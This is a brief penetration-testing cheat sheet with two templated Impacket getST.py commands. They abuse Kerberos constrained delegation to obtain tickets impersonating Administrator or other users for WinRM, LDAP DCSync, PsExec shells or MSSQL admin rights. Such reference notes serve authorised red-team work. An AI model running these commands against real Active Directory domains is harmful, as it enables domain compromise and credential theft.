# getST (imp)

% impacket-kerberos, windows, kerberos, 88, delegation

## Silver ticket (constrained delegation with protocol transition)
#plateform/linux #target/remote  #cat/ATTACK/DELEGATION 
HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
```
getST.py -spn <svc|host>/<target> -impersonate <target_user|Administrator> -dc-ip <dc_ip> '<domain>'/'<user>':'<password>'
```


## use silver ticket
HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
```
getST.py -spn <svc|host>/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
```
